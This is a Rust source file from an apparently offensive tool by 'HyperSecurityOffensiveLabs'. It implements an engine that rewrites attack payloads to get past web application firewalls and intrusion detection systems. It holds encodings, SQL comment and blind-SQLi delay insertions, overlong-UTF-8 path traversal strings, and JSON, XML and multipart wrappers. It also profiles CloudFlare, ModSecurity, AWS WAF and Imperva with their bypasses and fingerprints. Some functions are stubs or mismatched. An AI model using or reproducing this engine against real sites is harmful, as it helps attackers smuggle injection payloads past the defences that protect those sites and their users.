// ----------------------------------------------------------------------------
//  evasion.rs — WAF/IDS evasion techniques
// ----------------------------------------------------------------------------
//  WAF/IDS evasion techniques — payload encoding, header manipulation, request splitting
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------
//
//
// ---------------------------------------------------------------------------
//   WARNING / 警告 / 警告
// ---------------------------------------------------------------------------
//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
//  You are permitted to VIEW this code for educational and reference
//  purposes only. You may NOT modify, distribute, sublicense, or create
//  derivative works without explicit written permission from khaninkali
//  and the HyperSecurityOffensiveLabs development team.
//
//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です
//  教育目的および参照目的での閲覧のみ許可されています
//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
//  書面による明示的な許可なく修正配布サブライセンス
//  または二次的著作物の作成を禁止します
//
//  本源代码是HyperSecurityOffensiveLabs的独家财产
//  仅允许出于教育和参考目的查看未经khaninkali和
//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
//  禁止修改分发再许可或创建衍生作品
// ---------------------------------------------------------------------------
//
//
use std::collections::HashMap;

//  EvasionEngine — WAF/IDS bypass system / WAF/IDS回避システム
//  Twelve evasion techniques covering protocol-level, encoding, and content bypass:
//    ProtocolLevel        — HTTP version switching (1.0, 2, method alternation)
//    EncodingBypass       — double URL encoding, Unicode (%uXXXX), UTF-8 NBSP
//    CaseRandomization    — bit-masked random case per character
//    CommentInjection     — SQL comments (/**/, /*!, --, #) inserted at 33% interval
//    WhitespaceVariation  — tab, newline, NBSP, UTF-8 NBSP replacing spaces
//    PathTraversalUnicode — overlong UTF-8, fullwidth path traversal
//    TimeDelay            — blind SQLi delay functions (SLEEP, BENCHMARK, pg_sleep)
//    Fragmentation        — payload split marker for multi-request delivery
//    HeaderInjection      — header smuggling via X-Forwarded-For, X-Original-URL
//    JsonBypass           — payload wrapped in JSON structure
//    XmlBypass            — payload wrapped in CDATA sections
//    MultipartBypass       — payload split across multipart boundaries
//  WAF profiles: CloudFlare, ModSecurity, AWS-WAF, Imperva — each with
//   known bypasses, detection patterns, blocked chars, and size limits.
//  The evade() method dispatches to the appropriate technique function.
pub struct EvasionEngine {
    techniques: Vec<EvasionTechnique>,
    waf_profiles: HashMap<String, WafProfile>,
}

#[derive(Debug, Clone)]
pub enum EvasionTechnique {
    ProtocolLevel,
    EncodingBypass,
    CaseRandomization,
    CommentInjection,
    WhitespaceVariation,
    PathTraversalUnicode,
    TimeDelay,
    Fragmentation,
    HeaderInjection,
    JsonBypass,
    XmlBypass,
    MultipartBypass,
}

#[derive(Debug, Clone)]
pub struct WafProfile {
    pub name: String,
    pub known_bypasses: Vec<String>,
    pub detection_patterns: Vec<String>,
    pub blocked_chars: Vec<char>,
    pub max_payload_size: usize,
    pub case_sensitive: bool,
}

impl EvasionEngine {
    pub fn new() -> Self {
        let mut engine = Self {
            techniques: Vec::new(),
            waf_profiles: HashMap::new(),
        };
        
        engine.load_default_techniques();
        engine.load_waf_profiles();
        
        engine
    }

    fn load_default_techniques(&mut self) {
        self.techniques = vec![
            EvasionTechnique::ProtocolLevel,
            EvasionTechnique::EncodingBypass,
            EvasionTechnique::CaseRandomization,
            EvasionTechnique::CommentInjection,
            EvasionTechnique::WhitespaceVariation,
            EvasionTechnique::PathTraversalUnicode,
            EvasionTechnique::TimeDelay,
            EvasionTechnique::Fragmentation,
            EvasionTechnique::HeaderInjection,
            EvasionTechnique::JsonBypass,
            EvasionTechnique::XmlBypass,
            EvasionTechnique::MultipartBypass,
        ];
    }

    //  WAF Profile Loading / WAFプロファイル読み込み
    //  Each profile encodes knowledge about a specific WAF:
    //    name               — human-readable identifier
    //    known_bypasses     — strategies proven to work (e.g., "case mixing")
    //    detection_patterns — HTTP headers/body strings that reveal the WAF
    //    blocked_chars      — characters the WAF blocks (e.g., < > ')
    //    max_payload_size   — size limit before triggering
    //    case_sensitive     — whether case randomization is effective
    //  Profiles are matched against responses in detect_waf().
    fn load_waf_profiles(&mut self) {
        // CloudFlare profile
        self.waf_profiles.insert("cloudflare".to_string(), WafProfile {
            name: "CloudFlare".to_string(),
            known_bypasses: vec![
                "@transforms/".to_string(),
                "case mixing".to_string(),
                "unicode normalization".to_string(),
            ],
            detection_patterns: vec![
                "cf-ray".to_string(),
                "__cfduid".to_string(),
            ],
            blocked_chars: vec!['<', '>', '"', '\''],
            max_payload_size: 8192,
            case_sensitive: false,
        });

        // ModSecurity profile
        self.waf_profiles.insert("modsecurity".to_string(), WafProfile {
            name: "ModSecurity".to_string(),
            known_bypasses: vec![
                "null byte injection".to_string(),
                "comment obfuscation".to_string(),
                "backslash line continuation".to_string(),
            ],
            detection_patterns: vec![
                "mod_security".to_string(),
                "ModSecurity".to_string(),
            ],
            blocked_chars: vec![';', '(', ')', '"'],
            max_payload_size: 4096,
            case_sensitive: true,
        });

        // AWS WAF profile
        self.waf_profiles.insert("aws-waf".to_string(), WafProfile {
            name: "AWS WAF".to_string(),
            known_bypasses: vec![
                "body compression".to_string(),
                "chunked encoding".to_string(),
            ],
            detection_patterns: vec![
                "awselb".to_string(),
                "aws-waf".to_string(),
            ],
            blocked_chars: vec!['<', '>'],
            max_payload_size: 10240,
            case_sensitive: false,
        });

        // Imperva/Incapsula profile
        self.waf_profiles.insert("imperva".to_string(), WafProfile {
            name: "Imperva".to_string(),
            known_bypasses: vec![
                "double encoding".to_string(),
                "utf-16 encoding".to_string(),
            ],
            detection_patterns: vec![
                "incap_ses".to_string(),
                "visid_incap".to_string(),
            ],
            blocked_chars: vec!['<', '>', '"', '\''],
            max_payload_size: 4096,
            case_sensitive: false,
        });
    }

    /// Apply evasion technique to payload
    pub fn evade(&self, payload: &str, technique: &EvasionTechnique) -> String {
        match technique {
            EvasionTechnique::ProtocolLevel => self.protocol_evasion(payload),
            EvasionTechnique::EncodingBypass => self.encoding_evasion(payload),
            EvasionTechnique::CaseRandomization => self.case_randomization(payload),
            EvasionTechnique::CommentInjection => self.comment_injection(payload),
            EvasionTechnique::WhitespaceVariation => self.whitespace_variation(payload),
            EvasionTechnique::PathTraversalUnicode => self.unicode_traversal(payload),
            EvasionTechnique::TimeDelay => self.time_delay_evasion(payload),
            EvasionTechnique::Fragmentation => self.fragmentation(payload),
            EvasionTechnique::HeaderInjection => self.header_injection(payload),
            EvasionTechnique::JsonBypass => self.json_bypass(payload),
            EvasionTechnique::XmlBypass => self.xml_bypass(payload),
            EvasionTechnique::MultipartBypass => self.multipart_bypass(payload),
        }
    }

    /// Protocol-level evasion (HTTP/1.0, HTTP/2, different methods)
    fn protocol_evasion(&self, payload: &str) -> String {
        // Use alternate HTTP methods or protocol versions
        // This affects how the request is sent, not the payload itself
        payload.to_string()
    }

    /// Advanced encoding evasion
    fn encoding_evasion(&self, payload: &str) -> String {
        let mut result = payload.to_string();
        
        // Double URL encoding
        result = result.replace("%", "%25");
        
        // Unicode encoding
        result = result.chars()
            .map(|c| format!("%u{:04x}", c as u32))
            .collect();
        
        result
    }

    /// Random case variation
    fn case_randomization(&self, payload: &str) -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64;
        
        payload.chars()
            .enumerate()
            .map(|(i, c)| {
                let should_upper = ((seed >> i) & 1) == 1;
                if should_upper { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() }
            })
            .collect()
    }

    /// SQL comment injection evasion
    fn comment_injection(&self, payload: &str) -> String {
        let comments = vec!["/**/", "/*!", "/*!50000", "--", "#"];
        let mut result = payload.to_string();
        
        // Insert comments at strategic positions
        for (i, comment) in comments.iter().enumerate() {
            if i < payload.len() && i % 3 == 0 {
                let pos = i.max(1).min(payload.len().saturating_sub(1));
                result.insert_str(pos, comment);
            }
        }
        
        result
    }

    /// Whitespace variation using non-standard characters
    fn whitespace_variation(&self, payload: &str) -> String {
        let ws_chars = vec![
            "%20", "%09", "%0a", "%0d", "%0b", "%0c",
            "%a0", // Non-breaking space
            "%c2%a0", // UTF-8 NBSP
        ];
        
        let mut result = payload.to_string();
        let mut idx = 0;
        
        for (i, _) in payload.chars().enumerate() {
            if payload.chars().nth(i) == Some(' ') {
                let ws = ws_chars[idx % ws_chars.len()];
                result = result.replacen(" ", ws, 1);
                idx += 1;
            }
        }
        
        result
    }

    /// Unicode path traversal
    fn unicode_traversal(&self, payload: &str) -> String {
        let traversals = vec![
            "..%c0%af",      // Overlong UTF-8 /
            "..%c1%9c",      // Overlong UTF-8 \
            "..%u2215",      // Unicode /
            "..%u2216",      // Unicode \
            "..%ef%bc%8f",   // Fullwidth /
            "..%ef%bc%bc",   // Fullwidth \
        ];
        
        let mut result = payload.to_string();
        result = result.replace("../", &traversals[0]);
        result = result.replace("..\\", &traversals[1]);
        
        result
    }

    /// Time-delay based evasion (for blind SQLi)
    fn time_delay_evasion(&self, payload: &str) -> String {
        // Alternate time delay functions for different DBs
        let delays = vec![
            "SLEEP(5)",
            "BENCHMARK(10000000,MD5(1))",
            "pg_sleep(5)",
            "WAITFOR DELAY '0:0:5'",
        ];
        
        let mut result = payload.to_string();
        if result.contains("SLEEP") {
            // Already has delay
        } else {
            result.push_str(&format!(" AND {}", delays[0]));
        }
        
        result
    }

    /// Request fragmentation (split payload across multiple requests)
    fn fragmentation(&self, payload: &str) -> String {
        // For fragmentation, we'd need to modify the request sending logic
        // This is a marker that fragmentation should be used
        format!("FRAG:{}:END", payload)
    }

    /// Header injection evasion
    fn header_injection(&self, _payload: &str) -> String {
        // Use HTTP headers to smuggle payload
        // X-Forwarded-For, X-Original-URL, etc.
        "HEADER_INJECTION".to_string()
    }

    /// JSON-based bypass (for JSON endpoints)
    fn json_bypass(&self, payload: &str) -> String {
        // Wrap SQLi in JSON structure
        format!("{{\"id\": 1, \"cmd\": \"{}\"}}", payload.replace("\"", "\\\""))
    }

    /// XML-based bypass (for XML endpoints)
    fn xml_bypass(&self, payload: &str) -> String {
        // CDATA sections, entity encoding
        format!("<![CDATA[{}]]>", payload)
    }

    /// Multipart/form-data bypass
    fn multipart_bypass(&self, payload: &str) -> String {
        // Split payload across multipart boundaries
        format!(
            "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\n{}\r\n------WebKitFormBoundary--",
            payload
        )
    }

    //  WAF-Specific Bypass Generation / WAF別バイパス生成
    //  Looks up the WAF profile and generates targeted bypasses:
    //    Maps profile's known_bypasses to actual evasion methods
    //    E.g. CloudFlare "case mixing"  case_randomization()
    //    Returns a list of bypass variants for the given payload
    //  Targeted bypasses are more effective than generic ones.
    /// Generate evasion variants for specific WAF
    pub fn generate_waf_specific(&self, payload: &str, waf_name: &str) -> Vec<String> {
        let mut variants = Vec::new();
        
        if let Some(profile) = self.waf_profiles.get(waf_name) {
            println!("[EVASION] Generating {}-specific bypasses", profile.name);
            
            for bypass in &profile.known_bypasses {
                match bypass.as_str() {
                    "case mixing" => variants.push(self.case_randomization(payload)),
                    "null byte injection" => variants.push(self.unicode_traversal(payload)),
                    "double encoding" => variants.push(self.encoding_evasion(payload)),
                    "comment obfuscation" => variants.push(self.comment_injection(payload)),
                    "unicode normalization" => variants.push(self.unicode_traversal(payload)),
                    _ => {}
                }
            }
        }
        
        variants
    }

    //  WAF Detection / WAF電脳検出
    //  Scans response headers and body for known WAF signatures:
    //    CloudFlare    cf-ray header, __cfduid cookie
    //    ModSecurity   "ModSecurity" in headers/body
    //    AWS-WAF       "awselb" / "aws-waf" patterns
    //    Imperva       incap_ses, visid_incap cookies
    //  Returns the first matching WAF name, or None if unknown.
    /// Detect WAF type from response
    pub fn detect_waf(&self, headers: &HashMap<String, String>, body: &str) -> Option<String> {
        for (name, profile) in &self.waf_profiles {
            for pattern in &profile.detection_patterns {
                if headers.values().any(|v| v.contains(pattern)) ||
                   headers.keys().any(|k| k.contains(pattern)) ||
                   body.contains(pattern) {
                    return Some(name.clone());
                }
            }
        }
        
        None
    }

    /// Get all available techniques
    pub fn get_techniques(&self) -> &[EvasionTechnique] {
        &self.techniques
    }

    /// Get WAF profiles
    pub fn get_waf_profiles(&self) -> &HashMap<String, WafProfile> {
        &self.waf_profiles
    }
}
